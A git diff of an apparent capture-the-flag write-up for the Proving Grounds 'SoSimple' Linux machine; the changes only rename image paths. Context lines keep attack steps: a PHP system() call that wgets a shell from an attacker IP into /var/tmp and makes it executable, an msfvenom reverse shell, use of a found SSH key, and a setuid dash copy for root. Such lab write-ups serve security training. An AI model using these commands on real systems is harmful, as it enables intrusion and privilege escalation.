@@ -16,7 +16,7 @@ description: "Offsec proving grounds play linux machine writeup"
 ---
 # Walkthrough on Youtube
 
-[![youtube](/assets/images/CTF/Pg-Play/SoSimple/youtube.png)](https://youtu.be/KodURDujWxs)
+[![youtube](/assets/images/CTF/Proving_Grounds/SoSimple/youtube.png)](https://youtu.be/KodURDujWxs)
 
 ## NMAP
 ```sh
@@ -64,7 +64,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 ### Searchsploit
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/searchsploit.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/searchsploit.png)
 
 ### Exploit
 
@@ -133,33 +133,33 @@ system("wget http://192.168.45.217:8000/shell  -O /var/tmp/shell; chmod 755 /var
 </pre>
 ```
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/rfi.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/rfi.png)
 
 ### Reverse shell using msfvenom
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/rev_shell.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/rev_shell.png)
 
 Reverse shell connection obtained
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/max.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/max.png)
 
 ## Privilege Escalation
 
 User `max` ssh id_rsa file has been found.
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/id_rsa.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/id_rsa.png)
 
 ### SSH login to max
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/max.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/max.png)
 
 Listing `max` user permission, finding exploit for the `service` using GTFO bins and switch user to `steven`
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/steven.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/steven.png)
 
 Listing `steven` user permisssions
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/server-health.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/server-health.png)
 
 Create bash script using the location mentioned in the permissions.
 
@@ -173,11 +173,11 @@ cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash
 
 ### Running script as root user
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/dash.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/dash.png)
 
 **Run** `dash`
 
-![img](/assets/images/CTF/Pg-Play/SoSimple/proof.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/proof.png)
 
 `dash -p` preserves effective privilege with which it was created and executed with same privilege.
 
